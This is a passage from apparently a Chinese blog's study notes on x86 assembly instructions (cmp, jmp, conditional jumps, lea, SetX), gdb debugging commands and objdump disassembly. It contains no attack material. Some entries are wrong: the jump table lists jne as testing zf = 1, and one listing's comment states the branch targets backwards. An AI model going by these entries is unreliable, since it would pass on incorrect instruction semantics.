Call）两种。在近调用中CPU的操作如下： 将EIP寄存器的当前值压入到栈中供返回时使用 将被调用过程的偏移（相对于当前段）加载到EIP寄存器中 开始执行被调用过程 对于远调用，CPU执行的操作如下： 将CS寄存器的当前值压入到栈中供返回时使用 将EIP寄存器的当前值压入到栈中返回时使用 将包含被调用过程的代码段的段选择子加载到CS寄存器 被调用过程的偏移加载到EIP寄存器 开始执行被调用过程 3.cmp指令：比较指令，不改变操作数 ① 格式：cmp Src，Dest② 功能：Dest - Src，相当于减法指令，对两数进行相减，进行比较，但是不保存结果。③ 例子：&nbsp;&nbsp;&nbsp;&nbsp;mov ax，8&nbsp;&nbsp;&nbsp;&nbsp;mov bx，3&nbsp;&nbsp;&nbsp;&nbsp;cmp bx，ax执行后：（ax）= 8，zf = 0，of = 0，sf = 0，cf = 0 4.jmp指令：无条件跳转指令 ① 功能：汇编语言中的无条件跳转指令。无条件跳转指令可转到内存中任何程序段。转移地址可在指令中给出，也可以在寄存器中给出，或在储存器中指出。② 实例： jmp 1000H 段内直接转移，转移地址的偏移量由指令给出； jmp cx 段内间接转移，转移地址的偏移量由CX指出； jmp 1000H:2000H 段间直接转移，段码和偏移量由指令给出； jmp DWORD PTR [SI] 段间间接转移转移地址在SI所指地址开始的4个单元中； 5.je、jne、jb、jnb、ja、jna指令：转移的条件指令 指令&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;含义&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检测的相关标志位&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;等于则转移&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;zf = 1jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不等于则转移&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;zf = 1jb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;低于则转移&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cf = 1jnb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不低于则转移&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cf = 0ja&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;高于则转移&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cf = 0 且 zf = 0jna&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不高于则转移&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cf = 1 或 zf = 1 6.lea指令：取有效地址，也就是取偏移地址 ① 格式： 取偏移指令：lea Mem,reg16lea 指令将存储器操作数mem的4位16进制偏移地址送到指定的寄存器。这里，源操作数必须是存储器操作数，目标操作数必须是16位通用寄存器。因该寄存器常用来作为地址指针，故在此最好选用四个间址寄存器BX,BP,SI,DI之一。 取有效地址指令：lea Src,Dest取源操作数地址的偏移量，并把它传送到目的操作数所在的单元。lea 指令要求原操作数必须是存储单元，而且目的操作数必须是一个除段寄存器之外的16位或32位寄存器。当目的操作数是16位通用寄存器时，那么只装入有效地址的低16位。使用时要注意它与MOV指令的区别，MOV指令传送的一般是源操作数中的内容而不是地址。 ② 实例：假设：si=1000H , ds=5000H, (51000H)=1234H&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行指令 lea bx , [si]后，bx=1000H&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行指令 mov bx, [si]后，bx=1234H 二、gdb编译器相关用法1.gdb简介GDB（GNU Debugger）是GCC的调试工具。GDB主要帮忙你完成下面四个方面的功能，现描述如下： 启动你的程序，可以按照你的自定义的要求随心所欲的运行程序； 可让被调试的程序在你所指定的调置的断点处停住（断点可以是条件表达式） ； 当程序被停住时，可以检查此时你的程序中所发生的事； 动态的改变你程序的执行环境；2.生成调试信息gcc -g hello.c -o hello说明：一般来说GDB主要调试的是C/C++的程序。要调试C/C++的程序，首先在编译时，我们必须要把调试信息加到可执行文件中，使用编译器（cc/gcc/g++）的 -g 参数可以做到这一点。如果没有-g，你将看不见程序的函数名、变量名，所代替的全是运行时的内存地址。3.使用gdb打开文件gdb program4.运行程序run (r) 不指定运行参数 r 指定运行参数r 10 20 30 40 505.设置断点① 简单断点break (b) b 10 设置断点，在源程序第10行 b func 设置断点，在func函数入口处 ② 多文件设置断点 break filename:linenum:在源文件filename的linenum行处停住 ; break filename:function:在源文件filename的function函数的入口处停住; break class::function或function(type,type):在类class的function函数的入口处停住; break namespace::class::function:在名称空间为namespace的类class的function函数的入口处停住; ③ 查询所有的断点info b 6.观察点 watch 表达式（变量）expr设置一个观察点。当表达式值有变化时，马上停住程序； rwatch 表达式（变量）expr被读时，停住程序； awatch 表达式（变量）的值被读或被写时，停住程序； info watchpoints 列出当前所设置了的所有观察点；7.条件断点一般来说，为断点设置一个条件，我们使用if关键词，后面跟其断点条件。并且，条件设置好后，我们可以用condition命令来修改断点的条件。并且，条件设置好后，我们可以用condition命令来修改断点的条件。（只有break 和 watch命令支持if，catch目前暂不支持if）。设置一个条件断点：b test.c:8 if intValue == 58.调试代码 run 运行程序，可简写为r； next 单步跟踪，函数调用当作一条简单语句执行，可简写为n； step 单步跟踪，函数调进入被调用函数体内，可简写为s； finish 退出函数； until 在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体,可简写为u； continue 继续运行程序，可简写为c； stepi或si, nexti或ni 单步跟踪一条机器指令,一条程序代码有可能由数条机器指令完成，stepi和nexti可以单步执行机器指令； info program 来查看程序的是否在运行，进程号，被暂停的原因。9.查看运行时数据print 打印变量、字符串、表达式等的值，可简写为p p count：打印count的值 p cou1+cou2+cou3：打印表达式值 print接受一个表达式，GDB会根据当前的程序运行的数据来计算这个表达式，表达式可以是当前程序运行中的const常量、变量、函数等内容。但是GDB不能使用程序中定义的宏。 三、objdump常用的命令行1.objdump反汇编常用参数objdump -d &lt;file(s)&gt;: 将代码段反汇编；objdump -S &lt;file(s)&gt;: 将代码段反汇编的同时，将反汇编代码与源代码交替显示，编译时需要使用-g参数，即需要调试信息；objdump -C &lt;file(s)&gt;: 将C++符号名逆向解析；objdump -l &lt;file(s)&gt;:反汇编代码中插入文件名和行号；objdump -j section &lt;file(s)&gt;: 仅反汇编指定的section； 2.显示example.c的汇编代码——编译gcc -S -o example.s example.c 3.目标文件（.obj）汇编① 目标文件main.o的反汇编结果输出到文件main.o.txtgcc -c -o example.o example.cobjdump -s -d example.o &gt; example.o.txt② 反汇编同时显示源代码gcc -g -c -o example.o example.cobjdump -S -d example.o &gt; example.o.txt③ 显示源代码同时显示行号objdump -j .text -ld -C -S example.o &gt; example.o.txt 4.可执行文件（.exe）反汇编① 反汇编gcc -o example example.cobjdump -s -d example &gt; example.txt② 反汇编同时显示源代码:gcc -g -o example example.cobjdump -S -d example &gt; example.txt 四、学习感悟今天在总结这些知识点的时候，感觉自己的基础还是不够扎实，还在上面漂着，自己以后还得好好的把这些知识点消化掉，真正变成自己的。以后还得好好看看这些总结性的知识点，并在实践中不断提升自己的能力。 五、每日一句善待他人，体谅他人，热爱生命，努力生活。]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（十）]]></title>
    <url>%2F2019%2F04%2F16%2F2019.04.16%EF%BC%8838%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天开始着手做第二阶段的题目，但是发现第二阶段的题目对一些知识点要求比较高，于是今天先学习了一下第二阶段要用到的工具和知识，今天注重总结一下关于汇编语言的笔记。 汇编语言知识点： x86-32下的读取条件码指令 x86-64下的读取条件码指令 跳转指令 条件移动指令 一、x86-32位下的读取条件码指令1.SetX指令 功能：读取当前的条件码（或者某些条件码的组合），并存入目的字节寄存器 只存进一个byte，余下的三个字节不会被修改 把寄存器的最低的字节改掉了，那么高的三个字节怎么办？通常使用“movzbl”指令对目的寄存器进行高位的“0”扩展2.SetX常用指令&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SetX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Condition&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sete&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Equal / Zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Not Equal / Not Zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negative&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setns&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~SF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NonNegative&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~(SF^OF)&amp;~ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Greater(Signed)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setge&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~(SF^OF)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Greater or Equal(Signed)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(SF^OF)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Less(Signed)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(SF^OF) | ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Less or Equal(Signed)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~CF&amp;~ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Above(unsigned)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Below(unsigned)说明：~ 为取反3.SetX指令实例12345#C代码段int gt (int x, int y)&#123; return x &gt; y;&#125; 对应的汇编指令（Body）: movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12(%ebp),%eax&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;eax = y cmpl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%eax,8(%ebp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;Compare&nbsp;&nbsp;x&nbsp;:&nbsp;y setg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;al&nbsp;&nbsp;= x&nbsp;&nbsp;&gt;&nbsp;&nbsp;y movzbl&nbsp;&nbsp;&nbsp;%al,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Zero&nbsp;&nbsp;rest&nbsp;&nbsp;&nbsp;of&nbsp;&nbsp;&nbsp;%eax 说明：al 是什么意思，为什么在这里可以用 al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%eax是32位通用寄存器，它的低16位被称为%ax，%ax中的高8位和低8位成为 ah 和 al ，因为访问的特性要保持后向的兼容，所以在32位结构下面，还是能够以8位的形式，来访问eax的低8位（al）或者次低8位（ah）。 二、x86-64下的读取条件码指令1.SetX指令 功能：读取当前的条件码（或者某些条件码的组合），并存入目的字节寄存器（与32位下的语义一样） 余下的七个字节不会被修改 2.x86-64下的函数参数12345//C代码段int gt (int x, int y) long lgt (long x,long y)&#123; &#123; return x &gt; y; return x &gt; y;&#125; &#125; 说明：x in %rdi；y in %rsi上面的int 和 long 代码段所产生的汇编代码是一样的：Body段： xorl %eax,%eax&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;eax = 0 cmpq %rsi,%rdi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;Compare x : y setg %al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;al = x &gt; y 问题：xorl %eax,%eax是把eax清零，因为eax是32位寄存器，所以在32位下操作没有问题，但是在64位下低32位被清零，那么高32位怎么处理呢？答：在x86-64位体系下，如果进行一个32位的操作，32位的操作产生一个32位的 result，那么就会自动的零扩展，扩展到高32位。比如eax清零，那么在x86-64位下，0会自动扩展到rax的高32位。 三、跳转指令1.jx指令 依赖当前的条件码选择下一条执行语句（是否顺序执行）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Condition&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Unconditional&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#无条件跳转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;Equal / Zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Not Equal / Not Zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;js&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negative&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jns&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~SF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Nonnegative&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~(SF^OF)&amp;~ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Greater(Signed)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jge&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~(SF^OF)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Greater or Equal(Signed)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(SF^OF)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Less(Signed)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(SF^OF) | ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Less or Equal(Signed)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ja&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~CF&amp;~ZF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Above(unsigned)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Below(unsigned) 2.x86-32位下条件跳转实例 ① 实例12345678910#C代码段int absdiff(int x, int y)&#123; int result; if(x &gt; y) result = x - y; else result = y - x; return result; &#125; 编译生成的汇编代码(x86-32位)：01.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;absdiff:02.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pushl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%ebp03.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ebp04.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8(%ebp),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把x放到edx中05.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12(%ebp),%eax&nbsp;&nbsp;&nbsp;&nbsp;//把y放到eax中06.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmpl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%eax,%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//用edx - eax 相当于x - y。如果小于等于，则跳到08行；如果大于，则跳到14行07.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.L708.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;subl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%eax,%edx09.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%edx,%eax10.&nbsp;&nbsp;&nbsp;&nbsp;.L8:11.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;leave:12.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret:13.&nbsp;&nbsp;&nbsp;&nbsp;.L7:14.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;subl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%edx,%eax15.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.L8&nbsp;■:Body 1/2&nbsp;&nbsp;&nbsp;&nbsp;■:Set up&nbsp;&nbsp;&nbsp;&nbsp;■:Finish② 编译器工作原理编译器在编译的时候，会将原始的C代码变形为“goto”模式，使之接近编译出来的及其语言风格： 